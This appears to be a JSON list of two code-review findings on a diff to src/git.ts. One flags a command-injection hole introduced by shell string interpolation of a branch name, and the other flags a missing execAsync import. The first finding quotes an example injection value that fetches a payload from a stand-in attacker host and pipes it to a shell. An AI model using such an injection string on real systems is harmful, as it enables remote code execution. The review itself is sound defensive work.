  "findings": [
    {
      "title": "[P1] Pass the branch as an argument list, not an interpolated shell command",
      "body": "The rewrite replaces the injection-safe argument-array form with shell string interpolation. If `branch` contains shell metacharacters (e.g. `main; curl attacker.example/payload | sh`), `execAsync` runs arbitrary commands with the process's privileges, and even benign ref names containing shell-special characters are misparsed. `showBranch` is exported, so any caller passing user- or request-derived input (branch selectors, ref filters, API parameters) becomes exploitable. Restore the non-shell form — e.g. `execFileAsync(\"git\", [\"show\", branch])` — or validate `branch` against a strict ref-name pattern before building the string.",
      "severity": "P1",
      "location": {
        "path": "src/git.ts",
        "side": "RIGHT",
        "start": 15,
        "end": 16
      }
    },
    {
      "title": "[P1] Import or define `execAsync` before calling it",
      "body": "The only import in `src/git.ts` is `execFile` from `node:child_process`; a repository-wide search finds no declaration or import of `execAsync`. TypeScript therefore fails on the changed line (`Cannot find name 'execAsync'`), and if emitted anyway, every `showBranch()` call rejects with `ReferenceError: execAsync is not defined` before git runs. Note the base branch's `execFileAsync` reference had the same defect, but this diff rewrites the exact expression, so the fix belongs here: either restore the `execFile`-based call or import a promisified `exec` (e.g. `const execAsync = promisify(exec)`).",
      "severity": "P1",
      "location": {
        "path": "src/git.ts",
        "side": "RIGHT",
        "start": 16,
        "end": 16
      }
    }
  ],
